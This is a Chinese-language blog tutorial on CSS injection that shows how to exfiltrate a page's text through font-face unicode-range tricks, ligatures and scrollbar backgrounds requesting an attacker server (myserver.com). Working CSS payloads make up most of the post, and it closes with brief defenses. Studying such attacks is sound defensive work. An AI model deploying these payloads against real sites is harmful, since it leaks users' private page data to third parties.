---
title: CSS 衍生的資安問題(下) - 我愛偷甚麼就偷甚麼
---

## 前言

**除了偷屬性之外，有沒有辦法偷到其他東西？**

CSS Selector 只能選擇元素的屬性，沒有辦法選擇 Text Node (以下簡稱內文) 的內容，那我們有甚麼辦法使得 CSS 與內文的樣式扯上關係呢?

## 字體高度差異 + Scrollbar

不知道讀者有沒有想到 `font-family`! 我們可以透過設定字體來影響內文，你可能會說可以影響到文字的除了 font-family 以外還有 font-size, font-weight 等等，為甚麼是 font-family 成為我們的首選呢?

字體本身的樣式都各有千秋，比如說 `Comic Sans MS` 就長得比 `Courier New` 高。

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/233e8f05887a4cd0.png)

-----

現在讓我們看看下面的樣式:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        @font-face {
            font-family: "fa";
            src:local('Comic Sans MS');
            font-style:monospace;
            unicode-range: U+41;
        }
        div {
            font-size: 30px;
            height: 40px;
            width: 100px;
            font-family: fa, "Courier New";
            letter-spacing: 0px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="leak">AABC</div>
</body>
</html>
```

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/08be4250aa196c2d.png)

把預設的字體大小設為 30px，容器的高度調成 40px，我們自訂義了一個字體 fa(事實上就是 Comic Sans MS)，但這個字體只適用於 unicode 是 U+41 的字(也就是大寫的 A)，又因為我們設定 `overflow-y: auto`，所以 A 會採用高度突破天際的 Comic Sans MS，進而造成垂直的 Scroll bar。

**所以長 Scroll Bar 要幹嘛?????????**

有看前兩篇文章的讀者，應該知道 background 又可以派上用場了! 

```css
div::-webkit-scrollbar:vertical {
    background: url(https://myserver.com?q=a);
}
```

我們可以針對垂直 scrollbar 設定樣式，所以又可以偷偷打 request 到駭客的 Server 了。也就是說如果內文有 a，就會載入高的字體，長出 scrollbar，讓我們得到內文有 a 的資訊。

-----

**可是要怎麼一次載入多個 font-face!**

這肯定是你的下一個問題。我們可以這樣寫:

```css
        @font-face {
            font-family: "fa";
            src:local('Comic Sans MS');
            font-style:monospace;
            unicode-range: U+41;
        }
        
        @font-face {
            font-family: "fb";
            src:local('Comic Sans MS');
            font-style:monospace;
            unicode-range: U+42;
        }
        
        @font-face {
            font-family: "fc";
            src:local('Comic Sans MS');
            font-style:monospace;
            unicode-range: U+43;
        }
 
        div {
            font-size: 30px;
            height: 40px;
            width: 100px;
            font-family: fa, fb, fc, "Courier New";
            letter-spacing: 0px;
            overflow-y: auto;
        }
        
       div::-webkit-scrollbar:vertical {
           background: url(https://myserver.com?q=a);
       }
```

這樣一來 a 會載入 fa 字體、b 會載入 fb 字體、c 會載入 fc 字體，但問題是我哪知道是誰撐高了 div? 也就是說我的 background 的 request 要帶 a, b 還是 c?

-----

**有沒有辦法照順序一個字一個字載入?**

這邊開始會比較黑客一點，我們可以讓第一行第一次只有一個字(限制寬度)，其他字先移到第一行以外，接著我們將**字體依序載入**，同時 **backgroud 的 url 也依序改變**，這樣稱作一輪。

第二輪的一開始再將寬度調大一些讓第二字可以進入，這時一樣將**字體依序載入**，同時 **backgroud 的 url 也依序改變**。

這邊先上 CSS:

```CSS
/* 先把所有字元都載入 */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

/* 針對要竊取的地方要做的樣式 */
div.leak {
    overflow-y: auto; /* 如果高度超過會長 scrollbar */
    overflow-x: hidden; /* 怕有甚麼怪東西跑進同一行，水平超過的不顯示樣式 */
    height: 40px; /* 高度限制 40px */
    font-size: 0px; /* 字體大小設為 0, 使得第一行以外的字都不吃樣式 */
    letter-spacing: 0px; /* 字字間不要有間距方便計算 */
    word-break: break-all; /* 即便是切斷單字也要斷行 */
    font-family: rest; /* 預設字體 Courier New */
    background: grey;
    width: 0px; /* 一開始的寬度設為 0 */
    animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: 寬度每長胖一次(2 秒)，就換一輪 font-family(2 秒) */
    animation-iteration-count: 1, infinite; /* 高度從 0 ~ 最胖只要一輪,  font-family 可以一輪一輪一直重複 */
}

/* 針對第一行要做的樣式 */
div.leak::first-line{
    font-size: 30px; /* 預設字體大小 30px */
    text-transform: uppercase;
}

/* 一輪 font-family */
@keyframes trychar {
    0% { font-family: rest; } /* 因為要等寬度變胖，所以不馬上套用新的字體 */
    5% { font-family: has_A, rest; --leak: url(?a); } /* 變數 --leak = url(?a) */
    6% { font-family: rest; }
    10% { font-family: has_B, rest; --leak: url(?b); }
    11% { font-family: rest; }
    15% { font-family: has_C, rest; --leak: url(?c); }
    16% { font-family: rest }
    20% { font-family: has_D, rest; --leak: url(?d); }
    21% { font-family: rest; }
    25% { font-family: has_E, rest; --leak: url(?e); }
    26% { font-family: rest; }
    30% { font-family: has_F, rest; --leak: url(?f); }
    31% { font-family: rest; }
    35% { font-family: has_G, rest; --leak: url(?g); }
    36% { font-family: rest; }
    40% { font-family: has_H, rest; --leak: url(?h); }
    41% { font-family: rest }
    45% { font-family: has_I, rest; --leak: url(?i); }
    46% { font-family: rest; }
    50% { font-family: has_J, rest; --leak: url(?j); }
    51% { font-family: rest; }
    55% { font-family: has_K, rest; --leak: url(?k); }
    56% { font-family: rest; }
    60% { font-family: has_L, rest; --leak: url(?l); }
    61% { font-family: rest; }
    65% { font-family: has_M, rest; --leak: url(?m); }
    66% { font-family: rest; }
    70% { font-family: has_N, rest; --leak: url(?n); }
    71% { font-family: rest; }
    75% { font-family: has_O, rest; --leak: url(?o); }
    76% { font-family: rest; }
    80% { font-family: has_P, rest; --leak: url(?p); }
    81% { font-family: rest; }
    85% { font-family: has_Q, rest; --leak: url(?q); }
    86% { font-family: rest; }
    90% { font-family: has_R, rest; --leak: url(?r); }
    91% { font-family: rest; }
    95% { font-family: has_S, rest; --leak: url(?s); }
    96% { font-family: rest; }
}

/* 將寬度慢慢增大，每一次多容納一個字 */
@keyframes loop {
    0% { width: 0px }
    1% { width: 20px }
    2% { width: 40px }
    3% { width: 60px }
    4% { width: 80px }
    4% { width: 100px }
    5% { width: 120px }
    6% { width: 140px }
    7% { width: 0px }
}

div::-webkit-scrollbar {
    background: blue;
}

/* 垂直 scrollbar 的 background 向 --leak 變數要 request */
div::-webkit-scrollbar:vertical {
    background: blue var(--leak);
}
```

總之呢最後的效果就像這樣子 (如果要偷的內文是 `ABC`):

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/13495b63f5133050.gif)

它的缺點不難看見，那就是**重複的字不會再發 request** ，所以我們只知道不重複的字的順序。

## 究極大魔王 Ligature + Scrollbar

在進入究極大魔王之前，讀者需要知道甚麼是 Ligature (連字)，在一些字體裡面有一些連字會用特殊的方式顯示，像是 `fi`:

![](https://raw.githubusercontent.com/Wangpoching/blog-backup/main/assets/images/74eb26c675791e0b.png)

假設我們要偷的內文是 `"ABC"`，那麼我們可以先依序載入 `"A`、`"B`、`"C`... 的字體，所以`"A` 會成功被載入，我們故意將這組連字設的很長，讓橫向的 scroll bar 長出來，此時 Server 可以收到 background 的 request 得知連字 `"A`。

Server 端要如何製作字體請參考[這裡](https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/)。

接著 Server 發 API 修改 CSS (請參考[上篇](https://lidemy5thwbc.coderbridge.io/2022/10/03/css-injection-with-hotupdate/)，依序載入 `"AA`、`"AB`、`"AC`... 的字體，所以`"AB` 會成功被載入，我們故意將這組連字設的很長，讓橫向的 scroll bar 長出來，此時 Server 可以收到 background 的 request 得知連字 `"AB`。

底下是一輪的 CSS 的樣式:

```CSS
/* 先把所有字元都載入 */
@font-face{font-family:has_"A;src:url('https://myserver.com/font?query="A')}
@font-face{font-family:has_"B;src:url('https://myserver.com/font?query="B')}
@font-face{font-family:has_"C;src:url('https://myserver.com/font?query="C')}
@font-face{font-family:has_"D;src:url('https://myserver.com/font?query="D')}
@font-face{font-family:has_"E;src:url('https://myserver.com/font?query="E')}
@font-face{font-family:has_"F;src:url('https://myserver.com/font?query="F')}
@font-face{font-family:has_"G;src:url('https://myserver.com/font?query="G')}
@font-face{font-family:has_"H;src:url('https://myserver.com/font?query="H')}
@font-face{font-family:has_"I;src:url('https://myserver.com/font?query="I')}
@font-face{font-family:has_"J;src:url('https://myserver.com/font?query="J')}
@font-face{font-family:has_"K;src:url('https://myserver.com/font?query="K')}
@font-face{font-family:has_"L;src:url('https://myserver.com/font?query="L')}
@font-face{font-family:has_"M;src:url('https://myserver.com/font?query="M')}
@font-face{font-family:has_"N;src:url('https://myserver.com/font?query="N')}
@font-face{font-family:has_"O;src:url('https://myserver.com/font?query="O')}
@font-face{font-family:has_"P;src:url('https://myserver.com/font?query="P')}
@font-face{font-family:has_"Q;src:url('https://myserver.com/font?query="Q')}
@font-face{font-family:has_"R;src:url('https://myserver.com/font?query="R')}
@font-face{font-family:has_"S;src:url('https://myserver.com/font?query="S')}

/* 針對要竊取的地方要做的樣式 */
div.leak {
    overflow-x: auto; /* 如果長度超過會長 scrollbar */
    whitespace: nowrap; /* 不要折行 */
    font-family: rest; /* 預設字體 Courier New */
    width: 500px; /* 寬度設為 500px */
    animation: trychar step-end 2s 0s;
    animation-iteration-count: 1
}

/* 一輪 font-family */
@keyframes trychar {
    5% { font-family: has_"A; --leak: url(?a); } /* 變數 --leak = url(?a) 
    10% { font-family: has_"B; --leak: url(?b); }
    15% { font-family: has_"C; --leak: url(?c); }
    20% { font-family: has_"D; --leak: url(?d); }
    25% { font-family: has_"E; --leak: url(?e); }
    30% { font-family: has_"F; --leak: url(?f); }
    35% { font-family: has_"G; --leak: url(?g); }
    40% { font-family: has_"H; --leak: url(?h); }
    45% { font-family: has_"I; --leak: url(?i); }
    50% { font-family: has_"J; --leak: url(?j); }
    55% { font-family: has_"K; --leak: url(?k); }
    60% { font-family: has_"L; --leak: url(?l); }
    65% { font-family: has_"M; --leak: url(?m); }
    70% { font-family: has_"N; --leak: url(?n); }
    75% { font-family: has_"O; --leak: url(?o); }
    80% { font-family: has_"P; --leak: url(?p); }
    85% { font-family: has_"Q; --leak: url(?q); }
    90% { font-family: has_"R; --leak: url(?r); }
    95% { font-family: has_"S; --leak: url(?s); }
}

div::-webkit-scrollbar {
    background: blue;
}

/* 水平 scrollbar 的 background 向 --leak 變數要 request */
div::-webkit-scrollbar:horizontal {
    background: blue var(--leak);
}
```

## 後記 - CSS Injection 的防禦方式

看了三篇的 CSS Injection，相信讀者都累了，當膩了駭客讓我們思考如何防禦做個收尾吧!

1. 不要直接支援 style 用 CSS 寫
2. 將 @import 關起來 (像 Hackmd 一樣)
3. 限制 font-src
4. 設置多道關卡，例如除了 Csrf Token 以外可以再檢查其他 header

筆者原本想寫 WebRTC 的系列的，但一不小心聽到 CSS-Injection 新穎的攻擊方式便忍不住下海寫了這系列XD 

不知道 WebRTC 何年何月會產出呢! **且讓子彈飛一會兒吧!** 




